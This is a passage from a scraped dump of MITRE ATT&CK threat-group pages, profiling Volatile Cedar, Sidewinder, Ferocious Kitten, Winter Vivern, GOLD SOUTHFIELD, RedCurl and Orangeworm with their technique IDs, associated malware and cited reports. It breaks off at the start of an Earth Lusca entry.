Encrypted Channel: Symmetric Cryptography, Execution Guardrails: Environmental Keying, Exfiltration Over C2 Channel, Native API, Non-Standard Port, Obfuscated Files or Information: Fileless Storage, Obfuscated Files or Information: Steganography, Obfuscated Files or Information: Embedded Payloads, Process Injection: Thread Execution Hijacking, Process Injection: Portable Executable Injection, Reflective Code Loading, System Information Discovery, System Network Configuration Discovery, Virtualization/Sandbox Evasion: System Checks S0650 QakBot [1] Application Layer Protocol: Web Protocols, Application Window Discovery, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Browser Session Hijacking, Brute Force, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Create or Modify System Process: Windows Service, Credentials from Password Stores: Credentials from Web Browsers, Data Encoding: Standard Encoding, Data from Local System, Data Staged: Local Data Staging, Deobfuscate/Decode Files or Information, Domain Trust Discovery, Dynamic Resolution: Domain Generation Algorithms, Email Collection: Local Email Collection, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, Exploitation of Remote Services, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Hijack Execution Flow: DLL, Impair Defenses: Disable or Modify Tools, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Masquerade File Type, Modify Registry, Native API, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Binary Padding, Obfuscated Files or Information: Fileless Storage, Obfuscated Files or Information: HTML Smuggling, Obfuscated Files or Information: Command Obfuscation, Obfuscated Files or Information, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information: Software Packing, Peripheral Device Discovery, Permission Groups Discovery: Local Groups, Phishing: Spearphishing Link, Phishing: Spearphishing Attachment, Process Discovery, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: External Proxy, Remote System Discovery, Replication Through Removable Media, Scheduled Task/Job: Scheduled Task, Software Discovery: Security Software Discovery, Software Discovery, Steal Web Session Cookie, Subvert Trust Controls: Code Signing, Subvert Trust Controls: Mark-of-the-Web Bypass, System Binary Proxy Execution: Regsvr32, System Binary Proxy Execution: Msiexec, System Binary Proxy Execution: Rundll32, System Information Discovery, System Network Configuration Discovery: Internet Connection Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, System Time Discovery, User Execution: Malicious Link, User Execution: Malicious File, Virtualization/Sandbox Evasion: System Checks, Virtualization/Sandbox Evasion: Time Based Evasion, Windows Management Instrumentation References Proofpoint Threat Research and Team Cymru S2 Threat Research. (2024, April 4). Latrodectus: This Spider Bytes Like Ice . Retrieved May 31, 2024. "
},
{
"id": 206,
"title": "Volatile Cedar, Lebanese Cedar, Group G0123",
"path": "/groups/G0123/index.html",
"content": " Volatile Cedar Volatile Cedar is a Lebanese threat group that has targeted individuals, companies, and institutions worldwide. Volatile Cedar has been operating since 2012 and is motivated by political and ideological interests.[1][2] ID: G0123 \u24d8 Associated Groups: Lebanese Cedar Version: 1.1 Created: 08 February 2021 Last Modified: 16 April 2025 Version Permalink Live Version Associated Group Descriptions Name Description Lebanese Cedar [2] Techniques Used Domain ID Name Use Enterprise T1595 .002 Active Scanning: Vulnerability Scanning Volatile Cedar has performed vulnerability scans of the target server.[1][2] .003 Active Scanning: Wordlist Scanning Volatile Cedar has used DirBuster and GoBuster to brute force web directories and DNS subdomains.[2] Enterprise T1190 Exploit Public-Facing Application Volatile Cedar has targeted publicly facing web servers, with both automatic and manual vulnerability discovery.[1] [2] Enterprise T1105 Ingress Tool Transfer Volatile Cedar can deploy additional tools.[2] Enterprise T1505 .003 Server Software Component: Web Shell Volatile Cedar can inject web shell code into a server.[1][2] Software ID Name References Techniques S0572 Caterpillar WebShell [2][1] Brute Force, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, Exfiltration Over C2 Channel, File and Directory Discovery, Ingress Tool Transfer, Modify Registry, Network Service Discovery, Permission Groups Discovery: Local Groups, Process Discovery, Rootkit, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Service Discovery S0569 Explosive [1][2] Application Layer Protocol: Web Protocols, Clipboard Data, Data from Removable Media, Encrypted Channel: Symmetric Cryptography, Hide Artifacts: Hidden Files and Directories, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery References Threat Intelligence and Research. (2015, March 30). VOLATILE CEDAR. Retrieved February 8, 2021. ClearSky Cyber Security. (2021, January). \u201cLebanese Cedar\u201d APT Global Lebanese Espionage Campaign Leveraging Web Servers. Retrieved February 10, 2021. "
},
{
"id": 207,
"title": "Sidewinder, T-APT-04, Rattlesnake, Group G0121",
"path": "/groups/G0121/index.html",
"content": " Sidewinder Sidewinder is a suspected Indian threat actor group that has been active since at least 2012. They have been observed targeting government, military, and business entities throughout Asia, primarily focusing on Pakistan, China, Nepal, and Afghanistan.[1][2][3] ID: G0121 \u24d8 Associated Groups: T-APT-04, Rattlesnake Contributors: Lacework Labs; Daniyal Naeem, BT Security Version: 1.2 Created: 27 January 2021 Last Modified: 11 April 2024 Version Permalink Live Version Associated Group Descriptions Name Description T-APT-04 [3] Rattlesnake [3] Techniques Used Domain ID Name Use Enterprise T1071 .001 Application Layer Protocol: Web Protocols Sidewinder has used HTTP in C2 communications.[1][4][5] Enterprise T1119 Automated Collection Sidewinder has used tools to automatically collect system and network configuration information.[1] Enterprise T1020 Automated Exfiltration Sidewinder has configured tools to automatically send collected files to attacker controlled servers.[1] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Sidewinder has added paths to executables in the Registry to establish persistence.[4][5][3] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Sidewinder has used PowerShell to drop and execute malware loaders.[1] .005 Command and Scripting Interpreter: Visual Basic Sidewinder has used VBScript to drop and execute malware loaders.[1] .007 Command and Scripting Interpreter: JavaScript Sidewinder has used JavaScript to drop and execute malware loaders.[1][5] Enterprise T1074 .001 Data Staged: Local Data Staging Sidewinder has collected stolen files in a temporary folder in preparation for exfiltration.[1] Enterprise T1203 Exploitation for Client Execution Sidewinder has exploited vulnerabilities to gain execution including CVE-2017-11882 and CVE-2020-0674.[1][3] Enterprise T1083 File and Directory Discovery Sidewinder has used malware to collect information on files and directories.[1] Enterprise T1574 .001 Hijack Execution Flow: DLL Sidewinder has used DLL side-loading to drop and execute malicious payloads including the hijacking of the legitimate Windows application file rekeywiz.exe.[1] Enterprise T1105 Ingress Tool Transfer Sidewinder has used LNK files to download remote files to the victim's network.[1][3] Enterprise T1559 .002 Inter-Process Communication: Dynamic Data Exchange Sidewinder has used the ActiveXObject utility to create OLE objects to obtain execution through Internet Explorer.[4][5] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location Sidewinder has named malicious files rekeywiz.exe to match the name of a legitimate Windows executable.[5] Enterprise T1027 .010 Obfuscated Files or Information: Command Obfuscation Sidewinder has used base64 encoding for scripts.[1][4] .013 Obfuscated Files or Information: Encrypted/Encoded File Sidewinder has used base64 encoding and ECDH-P256 encryption for payloads.[1][4][3] Enterprise T1566 .001 Phishing: Spearphishing Attachment Sidewinder has sent e-mails with malicious attachments often crafted for specific targets.[1] .002 Phishing: Spearphishing Link Sidewinder has sent e-mails with malicious links often crafted for specific targets.[1][3] Enterprise T1598 .002 Phishing for Information: Spearphishing Attachment Sidewinder has sent e-mails with malicious attachments that lead victims to credential harvesting websites.[1][4][3] .003 Phishing for Information: Spearphishing Link Sidewinder has sent e-mails with malicious links to credential harvesting websites.[1] Enterprise T1057 Process Discovery Sidewinder has used tools to identify running processes on the victim's machine.[1] Enterprise T1518 Software Discovery Sidewinder has used tools to enumerate software installed on an infected host.[1][4] .001 Security Software Discovery Sidewinder has used the Windows service winmgmts:\\.\\root\\SecurityCenter2 to check installed antivirus products.[4] Enterprise T1218 .005 System Binary Proxy Execution: Mshta Sidewinder has used mshta.exe to execute malicious payloads.[4][5] Enterprise T1082 System Information Discovery Sidewinder has used tools to collect the computer name, OS version, installed hotfixes, as well as information regarding the memory and processor on a compromised host.[1][5] Enterprise T1016 System Network Configuration Discovery Sidewinder has used malware to collect information on network interfaces, including the MAC address.[1] Enterprise T1033 System Owner/User Discovery Sidewinder has used tools to identify the user of a compromised host.[1] Enterprise T1124 System Time Discovery Sidewinder has used tools to obtain the current system time.[1] Enterprise T1204 .001 User Execution: Malicious Link Sidewinder has lured targets to click on malicious links to gain execution in the target environment.[1][4][5][3] .002 User Execution: Malicious File Sidewinder has lured targets to click on malicious files to gain execution in the target environment.[1][4][5][3] Software ID Name References Techniques S0250 Koadic [1] Abuse Elevation Control Mechanism: Bypass User Account Control, Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Clipboard Data, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, Encrypted Channel: Asymmetric Cryptography, File and Directory Discovery, Hide Artifacts: Hidden Window, Ingress Tool Transfer, Network Service Discovery, Network Share Discovery, OS Credential Dumping: Security Account Manager, OS Credential Dumping: NTDS, Process Injection: Dynamic-link Library Injection, Remote Services: Remote Desktop Protocol, Scheduled Task/Job: Scheduled Task, System Binary Proxy Execution: Mshta, System Binary Proxy Execution: Regsvr32, System Binary Proxy Execution: Rundll32, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Services: Service Execution, Windows Management Instrumentation References Hegel, T. (2021, January 13). A Global Perspective of the SideWinder APT. Retrieved January 27, 2021. Global Research and Analysis Team . (2018, April 12). APT Trends report Q1 2018. Retrieved January 27, 2021. Cyble. (2020, September 26). SideWinder APT Targets with futuristic Tactics and Techniques. Retrieved January 29, 2021. Rewterz. (2020, April 20). Sidewinder APT Group Campaign Analysis. Retrieved January 29, 2021. Rewterz. (2020, June 22). Analysis on Sidewinder APT Group \u2013 COVID-19. Retrieved January 29, 2021. "
},
{
"id": 208,
"title": "Ferocious Kitten, Group G0137",
"path": "/groups/G0137/index.html",
"content": " Ferocious Kitten Ferocious Kitten is a threat group that has primarily targeted Persian-speaking individuals in Iran since at least 2015.[1] ID: G0137 Contributors: Pooja Natarajan, NEC Corporation India; Manikantan Srinivasan, NEC Corporation India; Hiroki Nagahama, NEC Corporation Version: 1.0 Created: 28 September 2021 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains Ferocious Kitten has acquired domains imitating legitimate sites.[1] Enterprise T1036 .002 Masquerading: Right-to-Left Override Ferocious Kitten has used right-to-left override to reverse executables\u2019 names to make them appear to have different file extensions, rather than their real ones.[1] .005 Masquerading: Match Legitimate Resource Name or Location Ferocious Kitten has named malicious files update.exe and loaded them into the compromise host's \"Public\" folder.[1] Enterprise T1588 .002 Obtain Capabilities: Tool Ferocious Kitten has obtained open source tools for its operations, including JsonCPP and Psiphon.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment Ferocious Kitten has conducted spearphishing campaigns containing malicious documents to lure victims to open the attachments.[1] Enterprise T1204 .002 User Execution: Malicious File Ferocious Kitten has attempted to convince victims to enable malicious content within a spearphishing email by including an odd decoy message.[1] Software ID Name References Techniques S0190 BITSAdmin [1] BITS Jobs, Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, Ingress Tool Transfer, Lateral Tool Transfer S0652 MarkiRAT [1] Application Layer Protocol: Web Protocols, BITS Jobs, Boot or Logon Autostart Execution: Shortcut Modification, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Clipboard Data, Command and Scripting Interpreter: Windows Command Shell, Credentials from Password Stores: Password Managers, Data from Local System, Data Staged: Local Data Staging, Exfiltration Over C2 Channel, File and Directory Discovery, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Match Legitimate Resource Name or Location, Native API, Process Discovery, Screen Capture, Software Discovery: Security Software Discovery, Software Discovery, System Information Discovery, System Location Discovery: System Language Discovery, System Owner/User Discovery References GReAT. (2021, June 16). Ferocious Kitten: 6 Years of Covert Surveillance in Iran. Retrieved September 22, 2021. "
},
{
"id": 209,
"title": "Winter Vivern, TA473, UAC-0114, Group G1035",
"path": "/groups/G1035/index.html",
"content": " Winter Vivern Winter Vivern is a group linked to Russian and Belorussian interests active since at least 2020 targeting various European government and NGO entities, along with sporadic targeting of Indian and US victims. The group leverages a combination of document-based phishing activity and server-side exploitation for initial access, leveraging adversary-controlled and -created infrastructure for follow-on command and control.[1][2][3][4][5] ID: G1035 \u24d8 Associated Groups: TA473, UAC-0114 Contributors: Onur Atali Version: 1.0 Created: 29 July 2024 Last Modified: 10 October 2024 Version Permalink Live Version Associated Group Descriptions Name Description TA473 [5] UAC-0114 [3] Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains Winter Vivern registered domains mimicking other entities throughout various campaigns.[1] .003 Acquire Infrastructure: Virtual Private Server Winter Vivern used adversary-owned and -controlled servers to host web vulnerability scanning applications.[2] Enterprise T1595 .002 Active Scanning: Vulnerability Scanning Winter Vivern has used remotely-hosted instances of the Acunetix vulnerability scanner.[2] Enterprise T1071 .001 Application Layer Protocol: Web Protocols Winter Vivern uses HTTP and HTTPS protocols for exfiltration and command and control activity.[2][3] Enterprise T1119 Automated Collection Winter Vivern delivered a PowerShell script capable of recursively scanning victim machines looking for various file types before exfiltrating identified files via HTTP.[3] Enterprise T1020 Automated Exfiltration Winter Vivern delivered a PowerShell script capable of recursively scanning victim machines looking for various file types before exfiltrating identified files via HTTP.[3] Enterprise T1059 Command and Scripting Interpreter Winter Vivern used XLM 4.0 macros for initial code execution for malicious document files.[1] .001 PowerShell Winter Vivern passed execution from document macros to PowerShell scripts during initial access operations.[1] Winter Vivern used batch scripts that called PowerShell commands as part of initial access and installation operations.[3] .003 Windows Command Shell Winter Vivern distributed Windows batch scripts disguised as virus scanners to prompt download of malicious payloads using built-in system tools.[2][3] .007 JavaScript Winter Vivern delivered malicious JavaScript to exploit targets when exploiting Roundcube Webmail servers.[4] Enterprise T1584 .006 Compromise Infrastructure: Web Services Winter Vivern has used compromised WordPress sites to host malicious payloads for download.[2] Enterprise T1140 Deobfuscate/Decode Files or Information Winter Vivern delivered exploit payloads via base64-encoded payloads in malicious email messages.[4] Enterprise T1189 Drive-by Compromise Winter Vivern created dedicated web pages mimicking legitimate government websites to deliver malicious fake anti-virus software.[3] Enterprise T1114 .001 Email Collection: Local Email Collection Winter Vivern delivered malicious JavaScript payloads capable of exfiltrating email messages from exploited email servers.[4] Enterprise T1041 Exfiltration Over C2 Channel Winter Vivern delivered a PowerShell script capable of recursively scanning victim machines looking for various file types before exfiltrating identified files via HTTP.[3] Enterprise T1190 Exploit Public-Facing Application Winter Vivern has exploited known and zero-day vulnerabilities in software usch as Roundcube Webmail servers and the \"Follina\" vulnerability.[4][5] Enterprise T1083 File and Directory Discovery Winter Vivern delivered malicious JavaScript payloads capable of listing folders and emails in exploited email servers.[4] Enterprise T1105 Ingress Tool Transfer Winter Vivern executed PowerShell scripts to create scheduled tasks to retrieve remotely-hosted payloads.[1] Enterprise T1056 .003 Input Capture: Web Portal Capture Winter Vivern registered and hosted domains to allow for creation of web pages mimicking legitimate government email logon sites to collect logon information.[2] Enterprise T1036 Masquerading Winter Vivern created specially-crafted documents mimicking legitimate government or similar documents during phishing campaigns.[2] .004 Masquerade Task or Service Winter Vivern has distributed malicious scripts and executables mimicking virus scanners.[2] Enterprise T1566 .001 Phishing: Spearphishing Attachment Winter Vivern leverages malicious attachments delivered via email for initial access activity.[1][2][3] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task Winter Vivern executed PowerShell scripts that would subsequently attempt to establish persistence by creating scheduled tasks objects to periodically retrieve and execute remotely-hosted payloads.[1] Enterprise T1113 Screen Capture Winter Vivern delivered PowerShell scripts capable of taking screenshots of victim machines.[3] Enterprise T1082 System Information Discovery Winter Vivern script execution includes basic victim information gathering steps which are then transmitted to command and control servers.[1] Enterprise T1033 System Owner/User Discovery Winter Vivern PowerShell scripts execute whoami to identify the executing user.[2] Enterprise T1204 .001 User Execution: Malicious Link Winter Vivern has mimicked legitimate government-related domains to deliver malicious webpages containing links to documents or other content for user execution.[2][3] References Chad Anderson. (2021, April 27). Winter Vivern: A Look At Re-Crafted Government MalDocs Targeting Multiple Languages. Retrieved July 29, 2024. Tom Hegel. (2023, March 16). Winter Vivern | Uncovering a Wave of Global Espionage. Retrieved July 29, 2024. CERT-UA. (2023, February 1). UAC-0114 aka Winter Vivern to target Ukrainian and Polish GOV entities (CERT-UA#5909). Retrieved July 29, 2024. Matthieu Faou. (2023, October 25). Winter Vivern exploits zero-day vulnerability in Roundcube Webmail servers. Retrieved July 29, 2024. Michael Raggi & The Proofpoint Threat Research Team. (2023, March 30). Exploitation is a Dish Best Served Cold: Winter Vivern Uses Known Zimbra Vulnerability to Target Webmail Portals of NATO-Aligned Governments in Europe. Retrieved July 29, 2024. "
},
{
"id": 210,
"title": "GOLD SOUTHFIELD, Pinchy Spider, Group G0115",
"path": "/groups/G0115/index.html",
"content": " GOLD SOUTHFIELD GOLD SOUTHFIELD is a financially motivated threat group active since at least 2018 that operates the REvil Ransomware-as-a Service (RaaS). GOLD SOUTHFIELD provides backend infrastructure for affiliates recruited on underground forums to perpetrate high value deployments. By early 2020, GOLD SOUTHFIELD started capitalizing on the new trend of stealing data and further extorting the victim to pay for their data to not get publicly leaked.[1][2][3][4] ID: G0115 \u24d8 Associated Groups: Pinchy Spider Contributors: Thijn Bukkems, Amazon Version: 2.0 Created: 22 September 2020 Last Modified: 16 April 2025 Version Permalink Live Version Associated Group Descriptions Name Description Pinchy Spider [4] Techniques Used Domain ID Name Use Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell GOLD SOUTHFIELD has staged and executed PowerShell scripts on compromised hosts.[5] Enterprise T1190 Exploit Public-Facing Application GOLD SOUTHFIELD has exploited Oracle WebLogic vulnerabilities for initial compromise.[1] Enterprise T1133 External Remote Services GOLD SOUTHFIELD has used publicly-accessible RDP and remote management and monitoring (RMM) servers to gain access to victim machines.[1] Enterprise T1027 .010 Obfuscated Files or Information: Command Obfuscation GOLD SOUTHFIELD has executed base64 encoded PowerShell scripts on compromised hosts.[5] Enterprise T1566 Phishing GOLD SOUTHFIELD has conducted malicious spam (malspam) campaigns to gain access to victim's machines.[1] Enterprise T1219 Remote Access Tools GOLD SOUTHFIELD has used the cloud-based remote management and monitoring tool \"ConnectWise Control\" to deploy REvil.[5] Enterprise T1113 Screen Capture GOLD SOUTHFIELD has used the remote monitoring and management tool ConnectWise to obtain screen captures from victim's machines.[5] Enterprise T1195 .002 Supply Chain Compromise: Compromise Software Supply Chain GOLD SOUTHFIELD has distributed ransomware by backdooring software installers via a strategic web compromise of the site hosting Italian WinRAR.[1][2][3] Enterprise T1199 Trusted Relationship GOLD SOUTHFIELD has breached Managed Service Providers (MSP's) to deliver malware to MSP customers.[1] Software ID Name References Techniques S0591 ConnectWise [6][5] Command and Scripting Interpreter: PowerShell, Screen Capture, Video Capture S0496 REvil [1][2] Access Token Manipulation: Create Process with Token, Access Token Manipulation: Token Impersonation/Theft, Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Visual Basic, Data Destruction, Data Encrypted for Impact, Deobfuscate/Decode Files or Information, Drive-by Compromise, Encrypted Channel: Asymmetric Cryptography, Execution Guardrails: Mutual Exclusion, Exfiltration Over C2 Channel, File and Directory Discovery, Impair Defenses: Safe Mode Boot, Impair Defenses: Disable or Modify Tools, Indicator Removal: File Deletion, Ingress Tool Transfer, Inhibit System Recovery, Loss of Productivity and Revenue, Masquerading: Match Legitimate Resource Name or Location, Masquerading, Modify Registry, Native API, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Fileless Storage, Permission Groups Discovery: Domain Groups, Phishing: Spearphishing Attachment, Process Injection, Query Registry, Remote Services, Scripting, Service Stop, Service Stop, Standard Application Layer Protocol, System Information Discovery, System Location Discovery: System Language Discovery, System Service Discovery, Theft of Operational Information, User Execution: Malicious File, User Execution, Windows Management Instrumentation References Counter Threat Unit Research Team. (2019, September 24). REvil/Sodinokibi Ransomware. Retrieved August 4, 2020. Secureworks . (2019, September 24). REvil: The GandCrab Connection. Retrieved August 4, 2020. Secureworks. (n.d.). GOLD SOUTHFIELD. Retrieved October 6, 2020. Meyers, Adam. (2021, July 6). The Evolution of PINCHY SPIDER from GandCrab to REvil. Retrieved March 28, 2023. Tetra Defense. (2020, March). CAUSE AND EFFECT: SODINOKIBI RANSOMWARE ANALYSIS. Retrieved November 17, 2024. Mele, G. et al. (2021, February 10). Probable Iranian Cyber Actors, Static Kitten, Conducting Cyberespionage Campaign Targeting UAE and Kuwait Government Agencies. Retrieved March 17, 2021. "
},
{
"id": 211,
"title": "RedCurl, Group G1039",
"path": "/groups/G1039/index.html",
"content": " RedCurl RedCurl is a threat actor active since 2018 notable for corporate espionage targeting a variety of locations, including Ukraine, Canada and the United Kingdom, and a variety of industries, including but not limited to travel agencies, insurance companies, and banks.[1] RedCurl is allegedly a Russian-speaking threat actor.[1][2] The group\u2019s operations typically start with spearphishing emails to gain initial access, then the group executes discovery and collection commands and scripts to find corporate data. The group concludes operations by exfiltrating files to the C2 servers. ID: G1039 Contributors: Joe Gumke, U.S. Bank Version: 1.0 Created: 23 September 2024 Last Modified: 23 September 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1087 .001 Account Discovery: Local Account RedCurl has collected information about local accounts.[1][2] .002 Account Discovery: Domain Account RedCurl has collected information about domain accounts using SysInternal\u2019s AdExplorer functionality .[1][2] .003 Account Discovery: Email Account RedCurl has collected information about email accounts.[1][2] Enterprise T1071 .001 Application Layer Protocol: Web Protocols RedCurl has used HTTP, HTTPS and Webdav protocls for C2 communications.[1][2] Enterprise T1560 .001 Archive Collected Data: Archive via Utility RedCurl has downloaded 7-Zip to decompress password protected archives.[3] Enterprise T1119 Automated Collection RedCurl has used batch scripts to collect data.[1][2] Enterprise T1020 Automated Exfiltration RedCurl has used batch scripts to exfiltrate data.[1][2] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder RedCurl has established persistence by creating entries in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.[1][2] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell RedCurl has used PowerShell to execute commands and to download malware.[1][2][3] .003 Command and Scripting Interpreter: Windows Command Shell RedCurl has used the Windows Command Prompt to execute commands.[1][2][3] .005 Command and Scripting Interpreter: Visual Basic RedCurl has used VBScript to run malicious files.[1][2] .006 Command and Scripting Interpreter: Python RedCurl has used a Python script to establish outbound communication and to execute commands using SMB port 445.[3] Enterprise T1555 .003 Credentials from Password Stores: Credentials from Web Browsers RedCurl used LaZagne to obtain passwords from web browsers.[1][2] Enterprise T1005 Data from Local System RedCurl has collected data from the local disk of compromised hosts.[1][2] Enterprise T1039 Data from Network Shared Drive RedCurl has collected data about network drives.[1][2] Enterprise T1587 .001 Develop Capabilities: Malware RedCurl has created its own tools to use during operations.[4] Enterprise T1114 .001 Email Collection: Local Email Collection RedCurl has collected emails to use in future phishing campaigns.[1] Enterprise T1573 .001 Encrypted Channel: Symmetric Cryptography RedCurl has used AES-128 CBC to encrypt C2 communications.[2] .002 Encrypted Channel: Asymmetric Cryptography RedCurl has used HTTPS for C2 communication.[1][2] Enterprise T1083 File and Directory Discovery RedCurl has searched for and collected files on local and network drives.[4][1][2] Enterprise T1564 .001 Hide Artifacts: Hidden Files and Directories RedCurl added the \"hidden\" file attribute to original files, manipulating victims to click on malicious LNK files.[1][2] Enterprise T1070 .004 Indicator Removal: File Deletion RedCurl has deleted files after execution.[1][2][3] Enterprise T1202 Indirect Command Execution RedCurl has used pcalua.exe to obfuscate binary execution and remote connections.[3] Enterprise T1056 .002 Input Capture: GUI Input Capture RedCurl prompts the user for credentials through a Microsoft Outlook pop-up.[1][2] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location RedCurl mimicked legitimate file names and scheduled tasks, e.g. MicrosoftCurrentupdatesCheck andMdMMaintenenceTask to mask malicious files and scheduled tasks.[1][2] Enterprise T1046 Network Service Discovery RedCurl has used netstat to check if port 4119 is open.[3] Enterprise T1027 Obfuscated Files or Information RedCurl has used malware with string encryption.[4] RedCurl has also encrypted data and has encoded PowerShell commands using Base64.[1][2] RedCurl has used PyArmor to obfuscate code execution of LaZagne. [1] Additionally, RedCurl has obfuscated downloaded files by renaming them as commonly used tools and has used echo, instead of file names themselves, to execute files.[3] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory RedCurl used LaZagne to obtain passwords from memory.[1][2] Enterprise T1566 .001 Phishing: Spearphishing Attachment RedCurl has used phishing emails with malicious files to gain initial access.[1][3] .002 Phishing: Spearphishing Link RedCurl has used phishing emails with malicious links to gain initial access.[1][2] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task RedCurl has created scheduled tasks for persistence.[1][2][3] Enterprise T1218 .011 System Binary Proxy Execution: Rundll32 RedCurl has used rundll32.exe to execute malicious files.[1][2][3] Enterprise T1082 System Information Discovery RedCurl has collected information about the target system, such as system information and list of network connections.[1][2] Enterprise T1080 Taint Shared Content RedCurl has placed modified LNK files on network drives for lateral movement.[1][2] Enterprise T1537 Transfer Data to Cloud Account RedCurl has used cloud storage to exfiltrate data, in particular the megatools utilities were used to exfiltrate data to Mega, a file storage service.[1][2] Enterprise T1199 Trusted Relationship RedCurl has gained access to a contractor to pivot to the victim\u2019s infrastructure.[4] Enterprise T1552 .001 Unsecured Credentials: Credentials In Files RedCurl used LaZagne to obtain passwords in files.[1][2] .002 Unsecured Credentials: Credentials in Registry RedCurl used LaZagne to obtain passwords in the Registry.[1][2] Enterprise T1204 .001 User Execution: Malicious Link RedCurl has used malicious links to infect the victim machines.[1][2] .002 User Execution: Malicious File RedCurl has used malicious files to infect the victim machines.[1][2][3] Enterprise T1102 Web Service RedCurl has used web services to download malicious files.[1][2] References Group-IB. (2020, August). RedCurl: The Pentest You Didn\u2019t Know About. Retrieved August 9, 2024. Group-IB. (2021, November). RedCurl: The Awakening. Retrieved August 14, 2024. Tancio et al. (2024, March 6). Unveiling Earth Kapre aka RedCurl\u2019s Cyberespionage Tactics With Trend Micro MDR, Threat Intelligence. Retrieved August 9, 2024. Antoniuk, D. (2023, July 17). RedCurl hackers return to spy on 'major Russian bank,' Australian company. Retrieved August 9, 2024. "
},
{
"id": 212,
"title": "Orangeworm, Group G0071",
"path": "/groups/G0071/index.html",
"content": " Orangeworm Orangeworm is a group that has targeted organizations in the healthcare sector in the United States, Europe, and Asia since at least 2015, likely for the purpose of corporate espionage.[1] Reverse engineering of Kwampirs, directly associated with Orangeworm activity, indicates significant functional and development overlaps with Shamoon.[2] ID: G0071 Contributors: Elger Vinicius S. Rodrigues, @elgervinicius, CYBINT Centre Version: 2.0 Created: 17 October 2018 Last Modified: 10 April 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1071 .001 Application Layer Protocol: Web Protocols Orangeworm has used HTTP for C2.[3] Enterprise T1021 .002 Remote Services: SMB/Windows Admin Shares Orangeworm has copied its backdoor across open network shares, including ADMIN$, C$WINDOWS, D$WINDOWS, and E$WINDOWS.[1] Software ID Name References Techniques S0099 Arp [1] Remote System Discovery, System Network Configuration Discovery S0106 cmd [1] Command and Scripting Interpreter: Windows Command Shell, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Lateral Tool Transfer, System Information Discovery S0100 ipconfig [1] System Network Configuration Discovery S0236 Kwampirs [1] Account Discovery: Local Account, Create or Modify System Process: Windows Service, Deobfuscate/Decode Files or Information, Fallback Channels, File and Directory Discovery, Ingress Tool Transfer, Masquerading: Masquerade Task or Service, Network Share Discovery, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Binary Padding, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Process Discovery, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Binary Proxy Execution: Rundll32, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, System Service Discovery S0039 Net [1] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery S0104 netstat [1] System Network Connections Discovery S0103 route [1] System Network Configuration Discovery S0096 Systeminfo [1] System Information Discovery References Symantec Security Response Attack Investigation Team. (2018, April 23). New Orangeworm attack group targets the healthcare sector in the U.S., Europe, and Asia. Retrieved May 8, 2018. Pablo Rinc\u00f3n Crespo. (2022, January). The link between Kwampirs (Orangeworm) and Shamoon APTs. Retrieved February 8, 2024. Symantec Security Response Attack Investigation Team. (2018, April 23). Orangeworm: Indicators of Compromise. Retrieved July 8, 2018. "
},
{
"id": 213,
"title": "Earth Lusca, TAG-22, Charcoal Typhoon, CHROMIUM, ControlX, Group G1006",
"path": "/groups/G1006/index.html",
